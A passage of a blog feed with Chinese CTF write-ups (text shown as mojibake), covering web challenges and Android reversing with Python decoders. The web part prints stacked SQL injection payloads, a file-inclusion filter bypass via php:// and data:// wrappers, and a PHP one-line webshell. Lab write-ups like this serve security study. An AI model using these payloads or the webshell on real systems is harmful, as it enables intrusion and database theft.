æŸ¥è¯¢é»˜è®¤çš„è¡¨å°±å¾—åˆ°flagäº†ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">rename</span> <span class="keyword">to</span> words1;<span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">rename</span> <span class="keyword">to</span> words; <span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">change</span> flag <span class="keyword">id</span> <span class="built_in">varchar</span>(<span class="number">50</span>);%23</span><br></pre></td></tr></table></figure><p><strong>æœ€åè¿™ä¸ªé¢˜ï¼Œå‡ºç°è¿™ä¸ªæ¼æ´çš„åŸå› æ˜¯ä½¿ç”¨äº†multi_query()æ‰§è¡Œä¸€æ¡æˆ–å¤šæ¡sqlè¯­å¥ã€‚</strong></p><h3 id="æå®¢å¤§æŒ‘æˆ˜-2019-Havefun"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Havefun" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun</h3><p>ä»æ³¨é‡Šä¸­çš„æç¤ºå¯ä»¥çœ‹åˆ°ï¼Œé€šè¿‡getæ–¹å¼è·å–å‚æ•°catï¼Œå¹¶æ¯”è¾ƒäº†catå‚æ•°å€¼æ˜¯ä¸æ˜¯å­—ç¬¦ä¸²dogï¼š</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210415130344338.png" alt="image-20210415130344338"></p><p>å¥½çªç„¶ï¼Œç›´æ¥ä¼ å…¥å¯¹åº”çš„å‚æ•°ï¼Œå¾—åˆ°flagã€‚ã€‚</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210415130430173.png" alt="image-20210415130430173"></p><h3 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h3><p>çœ‹wpåå¤ç°çš„ï¼ˆã€‚ã€‚</p><p>å°±ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œè¿˜æ˜¯å…ˆå°è¯•äº†ä¸€ä¸‹ä¹‹å‰çš„æ–¹æ³•ï¼Œè¾“å…¥1â€™æ˜¯å¦æŠ¥é”™ï¼ŒæŠ¥é”™ç±»å‹ï¼Œæˆ–è€…çœ‹è¾“å…¥1ä¸1+1çš„ç»“æœæ˜¯å¦ç›¸ç­‰ï¼Œä½†è¿™é‡Œéƒ½æ— æœã€‚ä½†æ˜¯å‘ç°å›æ˜¾åªæœ‰3ç§ï¼Œ1.ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼›2.Nonono.; 3.Array (    [0] =&gt; 1 )ã€‚</p><p>ä¸”å¯ä»¥å‘ç°ï¼Œå½“è¾“å…¥ä¸º0ï¼Œæ²¡æœ‰æ˜¾ç¤ºï¼Œçº¯å­—ç¬¦ä¸²ä¹Ÿæ²¡æœ‰æ˜¾ç¤ºï¼Œå­—ç¬¦ä¸²å¼€å¤´åŠ æ•°å­—ä¹Ÿæ˜¯æ²¡æœ‰æ˜¾ç¤ºï¼Œè¿™å…¶å®å°±å¯ä»¥æ€»ç»“ä¸ºè¾“å…¥0ï¼Œæ²¡æœ‰å›æ˜¾ï¼Œå› ä¸ºphpç§ï¼Œçº¯å­—ç¬¦ä¸²æˆ–è€…å­—ç¬¦ä¸²å¼€å¤´åŠ æ•°å­—éƒ½æ˜¯ä¼šè½¬åŒ–ä¸º0ã€‚</p><p>ç„¶åå½“è¾“å…¥æ•°å­—æ—¶ï¼Œå°±ä¼šæœ‰Array (    [0] =&gt; 1 )è¿™æ ·çš„å›æ˜¾ï¼Œä¸”éƒ½æ˜¯1ï¼Œæ˜¯dump_varæ˜¾ç¤ºçš„ã€‚ã€‚</p><p>ä»ä»¥ä¸Šå¯ä»¥çŒœæµ‹æŸ¥è¯¢è¯­å¥ä¸­æœ‰ || å·ï¼Œè¿™è¾“å‡ºç»“æœåªæœ‰0æˆ–1ã€‚</p><p>ä¸€ï¼Œå®˜æ–¹é¢˜è§£ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="keyword">set</span> sql_mode=PIPES_AS_CONCAT;<span class="keyword">select</span> <span class="number">1</span></span><br><span class="line">æ„é€ æˆ<span class="keyword">select</span> <span class="number">1</span>;<span class="keyword">set</span> sql_mode=PIPES_AS_CONCAT;<span class="keyword">select</span> <span class="number">1</span> || flag <span class="keyword">FROM</span> Flagï¼Œå…¶ä¸­PIPES_AS_CONCATèƒ½å°† || è§†ä¸ºå­—ç¬¦ä¸²è¿æ¥ç¬¦è€Œéæˆ–è¿ç®—ç¬¦ã€‚è¿™ç§æ¨¡å¼ä¸‹ä½¿ç”¨å­—æ¯è¿æ¥ä¼šæŠ¥é”™ï¼Œä½¿ç”¨æ•°å­—è¿æ¥æ‰ä¼šæŸ¥è¯¢å‡ºæ•°æ®ï¼Œå› ä¸ºè¿™ä¸ª || ç›¸å½“äºæ˜¯å°† <span class="keyword">select</span> <span class="number">1</span> å’Œ <span class="keyword">select</span> flag <span class="keyword">from</span> flag çš„ç»“æœæ‹¼æ¥åœ¨ä¸€èµ·ã€‚</span><br></pre></td></tr></table></figure><p>äºŒï¼Œéé¢„æœŸè§£ï¼š</p><p>å› ä¸ºæ²¡æœ‰è¿‡æ»¤*ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,1</span><br></pre></td></tr></table></figure><p>å³æŸ¥è¯¢è¡¨ä¸­æ‰€æœ‰å­—æ®µåå†æŸ¥è¯¢ä¸€ä¸ª0æˆ–1ã€‚</p><p>è´´ä¸€ä¸‹ç”¨é¢„æœŸè§£æŸ¥è¯¢çš„ç»“æœï¼š</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210415202556117.png" alt="image-20210415202556117"></p><h3 id="ACTF2020-æ–°ç”Ÿèµ›-Include"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Include" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Include"></a>[ACTF2020 æ–°ç”Ÿèµ›]Include</h3><h2 id="æ”»é˜²ä¸–ç•Œ"><a href="#æ”»é˜²ä¸–ç•Œ" class="headerlink" title="æ”»é˜²ä¸–ç•Œ"></a>æ”»é˜²ä¸–ç•Œ</h2><h3 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h3><p>ä»æç¤ºåˆå§‹é¡µé¢ï¼Œæƒ³åˆ°index.phpã€‚</p><p>è®¿é—®index.phpå‘ç°åˆè·³åˆ°1.phpé¡µé¢äº†ï¼Œä½†å¯ä»¥çœ‹åˆ°index.phpï¼Œä»å“åº”å¤´ä¸­çœ‹åˆ°flagï¼Œåªæ˜¯çŠ¶æ€ç ä¸º302ã€‚</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210312231932538.png" alt="image-20210312231932538"></p><p>å¯¹äºçŠ¶æ€ç 302ï¼Œå¯ä»¥ç®€å•ç†è§£ä¸ºè¯¥èµ„æºåŸæœ¬å­˜åœ¨ï¼Œä½†è¢«ä¸´æ—¶æ”¹å˜äº†ä½ç½®ã€‚ä¸€èˆ¬è¢«æ›¿æ¢äº†ä½ç½®åï¼Œæˆ‘ä»¬å†è®¿é—®çš„æ—¶å€™å°±ä¼šè‡ªåŠ¨é‡å®šå‘åˆ°ä¸€ä¸ªè®¾ç½®å¥½çš„ç½‘é¡µï¼Œä¸”æ”¹è¢«è®¾ç½®å¥½çš„ç½‘é¡µåœ¨å“åº”å¤´çš„Locationåˆç»™å‡ºï¼Œå¦‚ä¸Šå›¾ã€‚</p><h3 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h3><p>è€ƒäº†ä¸€ä¸ªrobots.txtçš„åè®®ï¼Œé¦–å…ˆè¯»äº†ä¸€ä¸‹é¢˜ç›®æä¾›çš„å…³äºè¿™ä¸ªçš„è‹±æ–‡æ–‡æ¡£ï¼Œæ€»ç»“ä¸€ä¸‹æ˜¯ï¼šåœ¨éµå¾ªè¿™ä¸ªåè®®çš„æœç´¢å¼•æ“è®¿é—®ä¸€ä¸ªç½‘ç«™æ—¶ï¼Œé¦–å…ˆè¦åšçš„å°±æ˜¯è®¿é—®è¯¥ç½‘ç«™ä¸‹çš„robots.txtæ–‡ä»¶ï¼Œè‹¥æ²¡æœ‰çš„è¯åˆ™è¡¨ç¤ºå¯ä»¥è®¿é—®è¯¥ç½‘ç«™ä¸‹çš„æ‰€æœ‰å†…å®¹ï¼Œè‹¥å‘ç°çš„è¯ï¼Œå°±è¯»å–è¿™ä¸ªæ–‡ä»¶ï¼Œå¹¶éµå®ˆè¿™ä¸ªæ–‡ä»¶ä¸­çš„åè®®æŒ‡ä»¤åªè®¿é—®è¢«å…è®¸è®¿é—®çš„å†…å®¹ã€‚</p><p>ä¸¾ä¸€ä¸ªä¾‹å­ï¼š</p><blockquote><p>ç¦æ­¢æ‰€æœ‰æœç´¢å¼•æ“è®¿é—®æœ¬ç½‘ç«™çš„æ‰€æœ‰å†…å®¹ï¼š<br><strong>User-agent: *</strong></p><p><strong>Disallow: /</strong></p></blockquote><p>æ‰€ä»¥è¯´è¿™ä¸ªæ–‡ä»¶é™åˆ¶äº†ä¸è¢«å…è®¸è®¿é—®çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™å…¶å®ä¹Ÿå°±é—´æ¥æ³„éœ²äº†è¿™ä¸ªç½‘ç«™çš„æ–‡ä»¶ç›®å½•ç»“æ„ã€‚</p><p>è®¿é—®robots.txtå¾—åˆ°ï¼š<br><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210313101940154.png" alt="image-20210313101940154"></p><p>è®¿é—®fl0g.phpå¾—åˆ°flagã€‚</p><h3 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h3><p>æˆ‘ä¸çŸ¥é“è¿™ä¸ªç‰ˆæœ¬çš„phpæœ‰è¿™ä¸ªæ¼æ´ï¼Œä¹Ÿæ²¡æœ‰æ„è¯†å»githubæœç›¸å…³ç‰ˆæœ¬çœ‹æ˜¯å¦æœ‰ç›¸å…³æ¼æ´ã€‚</p><p>è¿™é‡Œç›´æ¥çœ‹äº†wpï¼ŒçŸ¥é“æœ‰ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œç½‘ä¸Šåˆ©ç”¨æ–¹å¼ä¹Ÿæ˜¯å¾ˆå¤šï¼Œç›®å‰ä¹Ÿä¸ä¼šè‡ªå·±å†™åˆ©ç”¨ï¼Œ</p><p>ç›´æ¥ä½¿ç”¨ç°æˆçš„æ‰“äº†ä¸€ä¸‹ã€‚</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210313104841755.png" alt="image-20210313104841755"></p><h3 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h3><p>é¦–å…ˆè®°ä¸€ä¸‹2ä¸ªåŒ…å«çš„åŒºåˆ«ï¼š</p><ul><li>require ç”Ÿæˆä¸€ä¸ªè‡´å‘½é”™è¯¯ï¼ˆE_COMPILE_ERRORï¼‰ï¼Œåœ¨é”™è¯¯å‘ç”Ÿåè„šæœ¬ä¼šåœæ­¢æ‰§è¡Œã€‚</li><li>include ç”Ÿæˆä¸€ä¸ªè­¦å‘Šï¼ˆE_WARNINGï¼‰ï¼Œåœ¨é”™è¯¯å‘ç”Ÿåè„šæœ¬ä¼šç»§ç»­æ‰§è¡Œã€‚</li></ul><p>æ–‡ä»¶åŒ…å«æ¼æ´ã€‚</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210313152324318.png" alt="image-20210313152324318"></p><p>ä½¿ç”¨äº†strstrå‡½æ•°åŒ¹é…<strong>â€œphp://â€</strong>å­—ç¬¦ä¸²è¿›è¡Œè¿‡æ»¤ã€‚</p><blockquote><p>php://input</p><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒç›´æ¥å†™å…¥phpæ–‡ä»¶ã€‚</p></blockquote><p>ç°åœ¨è¦åšçš„å°±æ˜¯ç»•è¿‡ä¸Šé¢çš„å­—ç¬¦ä¸²è¿‡æ»¤ï¼Œå¯ä»¥ä½¿ç”¨strstrï¼ˆï¼‰å‡½æ•°åŒ¹é…å¤§å°å†™çš„ç‰¹æ€§ã€‚</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210313152604534.png" alt="image-20210313152604534"></p><p>çœ‹wpå­¦ä¹ ã€‚</p><p>è¿™ä¸ªé¢˜è¿˜å¯ä»¥ä½¿ç”¨data://ä¼ªåè®®ã€‚</p><p>ä½¿ç”¨æ–¹æ³•ï¼š<strong>data://text/plain;base64,base64ç¼–ç åçš„æ•°æ®</strong>ï¼ˆä¹Ÿå°±æ˜¯æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤ï¼‰<br><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210313153729207.png" alt="image-20210313153729207"></p><p>å¦å¤–è¿˜æœ‰å¯ä»¥ä¼ å…¥ä¸€å¥è¯æœ¨é©¬ã€‚<strong>è¿™é‡Œæˆ‘è¯•äº†ä¸‹ï¼Œä¸ºä»€ä¹ˆï¼›åä¸€å®šè¦ç©ºæ ¼æ‰å¯¹ã€‚</strong></p><p><strong><?php eval($_POST[root]); ?></strong></p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210313155834858.png" alt="image-20210313155834858"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Andriodä¹‹CTFå­¦ä¹ </title>
      <link href="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>ä»å„å¤„Androidé¢˜æ¥å­¦ä¹ ã€‚</p><a id="more"></a><h2 id="æ”»é˜²ä¸–ç•Œ"><a href="#æ”»é˜²ä¸–ç•Œ" class="headerlink" title="æ”»é˜²ä¸–ç•Œ"></a>æ”»é˜²ä¸–ç•Œ</h2><h3 id="easyjni"><a href="#easyjni" class="headerlink" title="easyjni"></a>easyjni</h3><p>æ¥åˆ°å…³é”®äº‹ä»¶ï¼Œå–å‡ºè¾“å…¥åä¼ å…¥aæ–¹æ³•ï¼Œåœ¨aæ–¹æ³•åˆæŠŠè¾“å…¥ä¼ å…¥äº†å®ä¾‹åŒ–çš„ä¸€ä¸ªaç±»å¯¹è±¡ä¸­çš„aæ–¹æ³•ã€‚å…¨æ˜¯aã€‚ã€‚æœ€åè°ƒç”¨nativeå±‚çš„ncheckå‡½æ•°ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210205171126725.png" alt="image-20210205171126725"></p><p>aç±»ä¸­çš„aæ–¹æ³•ä¸€ä¸ªæ¢è¡¨çš„base64ï¼Œnativeå±‚ncheckå‡½æ•°è¿›è¡Œç®€å•åŠ å¯†åä¸å¯†æ–‡å¯¹æ¯”ã€‚</p><p>nativeå±‚æœ‰JNIEnvæ–¹æ³•ï¼Œidaä¸ä¼šè‡ªåŠ¨è¯†åˆ«ï¼Œå°†æŒ‡å®šå˜é‡æ”¹ä¸€ä¸‹ç±»å‹å°±è¡Œäº†ã€‚<strong>JNIEnv*</strong></p><p>ç”¨ä¸€ä¸‹ida-pythonã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">base = [<span class="string">'i'</span>, <span class="string">'5'</span>, <span class="string">'j'</span>, <span class="string">'L'</span>, <span class="string">'W'</span>, <span class="string">'7'</span>, <span class="string">'S'</span>, <span class="string">'0'</span>, <span class="string">'G'</span>, <span class="string">'X'</span>, <span class="string">'6'</span>, <span class="string">'u'</span>, <span class="string">'f'</span>, <span class="string">'1'</span>, <span class="string">'c'</span>, <span class="string">'v'</span>, <span class="string">'3'</span>, <span class="string">'n'</span>, <span class="string">'y'</span>, <span class="string">'4'</span>, <span class="string">'q'</span>, <span class="string">'8'</span>, <span class="string">'e'</span>, <span class="string">'s'</span>, <span class="string">'2'</span>, <span class="string">'Q'</span>, <span class="string">'+'</span>, <span class="string">'b'</span>, <span class="string">'d'</span>, <span class="string">'k'</span>, <span class="string">'Y'</span>, <span class="string">'g'</span>, <span class="string">'K'</span>, <span class="string">'O'</span>, <span class="string">'I'</span>, <span class="string">'T'</span>, <span class="string">'/'</span>, <span class="string">'t'</span>, <span class="string">'A'</span>, <span class="string">'x'</span>, <span class="string">'U'</span>, <span class="string">'r'</span>, <span class="string">'F'</span>, <span class="string">'l'</span>, <span class="string">'V'</span>, <span class="string">'P'</span>, <span class="string">'z'</span>, <span class="string">'h'</span>, <span class="string">'m'</span>, <span class="string">'o'</span>, <span class="string">'w'</span>, <span class="string">'9'</span>, <span class="string">'B'</span>, <span class="string">'H'</span>, <span class="string">'C'</span>, <span class="string">'M'</span>, <span class="string">'D'</span>, <span class="string">'p'</span>, <span class="string">'E'</span>, <span class="string">'a'</span>, <span class="string">'J'</span>, <span class="string">'R'</span>, <span class="string">'Z'</span>, <span class="string">'N'</span>]</span><br><span class="line">base1 = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line">s = <span class="string">'MbT3sQgX039i3g==AQOoMQFPskB1Bsc7'</span></span><br><span class="line">s = list(s)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)//<span class="number">2</span>):</span><br><span class="line">    s[<span class="number">2</span>*i], s[<span class="number">2</span>*i+<span class="number">1</span>] = s[<span class="number">2</span>*i+<span class="number">1</span>], s[<span class="number">2</span>*i]</span><br><span class="line">s = s[<span class="number">16</span>:<span class="number">32</span>]+s[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line">ans = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">if</span> i != <span class="string">'='</span>:</span><br><span class="line">        ans += [base.index(i)]</span><br><span class="line">flag = [base1[i] <span class="keyword">for</span> i <span class="keyword">in</span> ans]</span><br><span class="line">flag = base64.b64decode(<span class="string">''</span>.join(flag)+<span class="string">'=='</span>)</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#flag&#123;just_ANot#er_@p3&#125;</span></span><br></pre></td></tr></table></figure><h3 id="app3"><a href="#app3" class="headerlink" title="app3"></a>app3</h3><p>è¿™ä¸ªé¢˜æ¶‰åŠçš„çŸ¥è¯†æŒºå¤šï¼Œå¯¹åˆå­¦å®‰å“æŒºä¸é”™çš„ã€‚</p><p>ä»010editorå‘ç°äº†ANDROID BACKUPï¼Œå®‰å“å¤‡ä»½æ–‡ä»¶ã€‚å¼€å§‹å‡ºç°æ–°çš„çŸ¥è¯†äº†ï¼Œæ‰¾äº†ä¸€ç¯‡æ–‡ç« è®²è¿™ä¸ªçš„å­¦ä¹ äº†ä¸€ä¸‹ï¼Œè®²çš„çœŸå¥½ã€‚<a href="https://blog.csdn.net/qq_31387043/article/details/51452782" target="_blank" rel="noopener">Androidä¸­allowBackup</a>ï¼ŒçŸ¥é“äº†è¿™ä¸ªå¯ä»¥ç”¨android-backup-extractor(abe)å·¥å…·æ¥è§£æabæ–‡ä»¶ã€‚</p><p>å¯¹äºabæ–‡ä»¶ï¼Œå‰24å­—èŠ‚ç±»ä¼¼æ–‡ä»¶å¤´çš„ä¸œè¥¿ï¼Œè‹¥æ–‡ä»¶æ˜¯åŠ å¯†çš„è¯ï¼Œå¯ä»¥åœ¨å‰24å­—èŠ‚ä¸­çœ‹è§AES-256æ ‡å¿—ï¼Œå¦åˆ™å‡ºç°noneå­—ç¬¦ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210205222314992.png" alt="image-20210205222314992"></p><p>ä½¿ç”¨<code>java -jar abe.jar unpack 1.ab 1.tar</code>è§£ææ–‡ä»¶ï¼Œè¿™æ ·å¾—åˆ°ä¸€ä¸ªtarå‹ç¼©åŒ…ã€‚è§£å‹åå‘ç°æœ‰ä¸€ä¸ªapkæ–‡ä»¶å’Œä¸€äº›æ•°æ®åº“æ–‡ä»¶ã€‚</p><p>ä¸Šå­¦æœŸå­¦ä¹ äº†javaå’Œmysqlè¿™2é—¨è¯¾ç¨‹ï¼ŒçœŸæ˜¯å¥½ã€‚hhaã€‚ã€‚</p><p>çœ‹äº†çœ‹åç¼–è¯‘apkä¸­çš„ä»£ç ï¼Œå‘ç°åˆ›å»ºè¡¨æ“ä½œå’Œå…¶ä¸­åŒ…å«çš„flagæ–‡ä»¶ï¼š</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210205222830438.png" alt="image-20210205222830438"></p><p>å†åŠ ä¸Šå¤–é¢çš„æ•°æ®åº“æ–‡ä»¶ï¼Œå¯ä»¥çŒœæµ‹æˆ‘ä»¬çš„flagå°±é‚£äº›æ•°æ®åº“ä¸­ã€‚</p><p>æŸ¥è¯¢ç›¸å…³èµ„æ–™ï¼ŒçŸ¥é“äº†è¿™ä¸ªè¦ç”¨DB Browser for SQLiteä¸­çš„SQLCiperçš„æ‰“å¼€ï¼Œä¸‹è½½åå‡†å¤‡æ‰“å¼€æ•°æ®åº“æ–‡ä»¶å‘ç°è¦å¯†ç ã€‚è¿™ä¹Ÿå’ŒçŒœæƒ³çš„ä¸€æ ·ï¼Œé¢˜ç›®å°±æ˜¯è¦è®©æˆ‘ä»¬æ‰¾è¿™ä¸ªå¯†ç ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210205223604786.png" alt="image-20210205223604786"></p><p>å¯¹äºkeyï¼Œé€šè¿‡ä¼ å…¥Strangerå’Œ123456ç»è¿‡aåŒ…ä¸­çš„aï¼Œbç±»ä¸­çš„æ–¹æ³•åŠ å¯†ã€‚aç±»ä¸­çš„æ–¹æ³•å°±æ˜¯å­—ç¬¦ä¸²æˆªå–æ“ä½œï¼Œbç±»ä¸­çš„æ–¹æ³•ä¸€ä¸ªMD5ä¸€ä¸ªSHA-1ã€‚ç¨‹åºæ˜¯å¯ä»¥è°ƒè¯•çš„ï¼Œæ‰€ä»¥ç›´æ¥è°ƒè¯•å¾—åˆ°keyã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210205223928065.png" alt="image-20210205223928065"></p><p>æ‰“å¼€æ•°æ®åº“å¾—åˆ°ä¸€ä¸²base64å­—ç¬¦ä¸²ï¼Œè§£å¯†å¾—åˆ°flagã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210205224023165.png" alt="image-20210205224023165"></p><h3 id="easy-apk"><a href="#easy-apk" class="headerlink" title="easy-apk"></a>easy-apk</h3><p>æ‰¾åˆ°ä¸»æ´»åŠ¨ï¼Œå°±ä¸€ä¸ªå˜è¡¨çš„base64ç¼–ç ï¼Œpythonç®€å•å†™ä¸€ä¸‹å°±å¥½ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">base = [<span class="string">'v'</span>, <span class="string">'w'</span>, <span class="string">'x'</span>, <span class="string">'r'</span>, <span class="string">'s'</span>, <span class="string">'t'</span>, <span class="string">'u'</span>, <span class="string">'o'</span>, <span class="string">'p'</span>, <span class="string">'q'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>,</span><br><span class="line">        <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'D'</span>, <span class="string">'E'</span>, <span class="string">'F'</span>, <span class="string">'G'</span>, <span class="string">'H'</span>, <span class="string">'I'</span>, <span class="string">'J'</span>,</span><br><span class="line">        <span class="string">'y'</span>, <span class="string">'z'</span>, <span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'P'</span>, <span class="string">'Q'</span>, <span class="string">'R'</span>, <span class="string">'S'</span>, <span class="string">'T'</span>, <span class="string">'K'</span>, <span class="string">'L'</span>, <span class="string">'M'</span>,</span><br><span class="line">        <span class="string">'N'</span>, <span class="string">'O'</span>, <span class="string">'Z'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'U'</span>, <span class="string">'V'</span>, <span class="string">'W'</span>, <span class="string">'X'</span>, <span class="string">'Y'</span>, <span class="string">'e'</span>,</span><br><span class="line">        <span class="string">'f'</span>, <span class="string">'g'</span>, <span class="string">'h'</span>, <span class="string">'i'</span>, <span class="string">'j'</span>, <span class="string">'k'</span>, <span class="string">'l'</span>, <span class="string">'m'</span>, <span class="string">'n'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">'+'</span>, <span class="string">'/'</span>]</span><br><span class="line">enc = <span class="string">'5rFf7E2K6rqN7Hpiyush7E6S5fJg6rsi5NBf6NGT5rs='</span></span><br><span class="line">ans = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="keyword">if</span> i != <span class="string">'='</span>:</span><br><span class="line">        ans += [base.index(i)]</span><br><span class="line">ans = <span class="string">''</span>.join([<span class="string">'&#123;:0&gt;6&#125;'</span>.format(bin(i)[<span class="number">2</span>:]) <span class="keyword">for</span> i <span class="keyword">in</span> ans])</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(ans)//<span class="number">8</span>):</span><br><span class="line">    flag += chr(int(ans[<span class="number">8</span>*i:<span class="number">8</span>*(i+<span class="number">1</span>)], <span class="number">2</span>))</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#05397c42f9b6da593a3644162d36eb01</span></span><br></pre></td></tr></table></figure><h3 id="easy-so"><a href="#easy-so" class="headerlink" title="easy-so"></a>easy-so</h3><p>ç®€å•è€ƒäº†javaä¸­å¯¹åŠ¨æ€é“¾æ¥åº“çš„è°ƒç”¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s = list(<span class="string">'f72c5a36569418a20907b55be5bf95ad'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)//<span class="number">2</span>):</span><br><span class="line">    s[<span class="number">2</span>*i], s[<span class="number">2</span>*i+<span class="number">1</span>] = s[<span class="number">2</span>*i+<span class="number">1</span>], s[<span class="number">2</span>*i]</span><br><span class="line">flag = s[len(s)//<span class="number">2</span>:len(s)] + s[<span class="number">0</span>:len(s)//<span class="number">2</span>]</span><br><span class="line">print(<span class="string">''</span>.join(flag))</span><br><span class="line"><span class="comment">#90705bb55efb59da7fc2a5636549812a</span></span><br></pre></td></tr></table></figure><h3 id="easyjava"><a href="#easyjava" class="headerlink" title="easyjava"></a>easyjava</h3><p>å°±æ˜¯è¯»ç¹ççš„javaä»£ç ï¼Œç†è§£ç¨‹åºåŠ å¯†æµç¨‹ã€‚</p><p>è€ƒç‚¹ï¼šjavaä»£ç çš„é˜…è¯»èƒ½åŠ›ï¼›ç®€å•çš„ç½®æ¢åŠ å¯†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 